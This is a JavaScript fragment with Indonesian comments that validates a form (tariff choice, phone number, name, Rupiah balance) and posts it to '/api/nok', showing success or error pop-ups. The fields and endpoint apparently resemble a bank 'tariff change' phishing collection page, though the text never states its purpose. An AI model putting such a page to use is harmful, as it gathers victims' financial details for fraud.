    // Fungsi untuk menampilkan notifikasi
    function showNotification(message, isSuccess) {
        // Buat elemen notifikasi jika belum ada
        if (!document.getElementById('notification')) {
            const notification = document.createElement('div');
            notification.id = 'notification';
            notification.style.cssText = `
                position: fixed;
                top: 20px;
                left: 50%;
                transform: translateX(-50%);
                padding: 12px 20px;
                border-radius: 4px;
                color: white;
                font-weight: bold;
                z-index: 999999999;
                display: none;
                max-width: 80%;
                text-align: center;
            `;
            document.body.appendChild(notification);
            
            const notificationText = document.createElement('span');
            notificationText.id = 'notificationText';
            notification.appendChild(notificationText);
        }
        
        const notification = document.getElementById('notification');
        const notificationText = document.getElementById('notificationText');
        
        notificationText.textContent = message;
        notification.style.background = isSuccess ? '#4CAF50' : '#F44336';
        notification.style.display = 'block';
        
        // Sembunyikan notifikasi setelah 5 detik
        setTimeout(() => {
            notification.style.display = 'none';
        }, 5000);
    }

    // Fungsi untuk mengirim data form
    async function sendFormData(formData) {
        try {
            // Tampilkan loading
            document.getElementById('djload').style.display = 'flex';
            
            // Kirim ke API
            const response = await fetch('/api/nok', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData)
            });
            
            const result = await response.json();
            
            if (result.success) {
                showNotification('‚úÖ Data berhasil dikirim!', true);
                // Reset form setelah berhasil
                document.getElementById('formHP').reset();
            } else {
                showNotification('‚ùå ' + result.message, false);
            }
        } catch (error) {
            console.error('Error:', error);
            showNotification('‚ùå Terjadi kesalahan jaringan. Silakan coba lagi.', false);
        } finally {
            // Sembunyikan loading
            document.getElementById('djload').style.display = 'none';
        }
    }

    // Fungsi untuk menghapus format Rupiah
    function removeFormatRupiah(value) {
        return value.replace(/[^\d]/g, '');
    }

    // Fungsi untuk menangani pengiriman form
    function handleFormSubmit(e) {
        e.preventDefault();
        
        // Ambil nilai dari form
        const tarif = document.querySelector('input[name="tarif"]:checked')?.value;
        const nohp = document.getElementById('nohp').value;
        const nama = document.getElementById('nama').value;
        const saldo = removeFormatRupiah(document.getElementById('saldo').value);
        
        // Validasi pilihan tarif
        if (!tarif) {
            showNotification('‚ùå Silakan pilih jenis tarif terlebih dahulu', false);
            return;
        }
        
        // Validasi nomor HP
        if (!nohp || nohp.length < 10) {
            showNotification('‚ùå Nomor HP tidak valid', false);
            return;
        }
        
        // Validasi nama
        if (!nama) {
            showNotification('‚ùå Nama harus diisi', false);
            return;
        }
        
        // Validasi saldo
        if (!saldo) {
            showNotification('‚ùå Saldo harus diisi', false);
            return;
        }
        
        const formData = {
            tarif: tarif,
            nohp: nohp,
            nama: nama,
            saldo: saldo
        };
        
        // Tampilkan loading state pada tombol
        const submitBtn = document.getElementById('btnSubmit1');
        const originalText = submitBtn.innerHTML;
        submitBtn.innerHTML = 'MEMPROSES...';
        submitBtn.disabled = true;
        
        // Kirim data
        sendFormData(formData).finally(() => {
            // Kembalikan tombol ke state semula
            submitBtn.innerHTML = originalText;
            submitBtn.disabled = false;
        });
    }

    // Format input saldo sebagai Rupiah
    function formatRupiah(angka, prefix) {
        var number_string = angka.replace(/[^,\d]/g, '').toString(),
            split = number_string.split(','),
            sisa = split[0].length % 3,
            rupiah = split[0].substr(0, sisa),
            ribuan = split[0].substr(sisa).match(/\d{3}/gi);
            
        if (ribuan) {
            separator = sisa ? '.' : '';
            rupiah += separator + ribuan.join('.');
        }
        
        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
    }

    // Event listener ketika dokumen siap
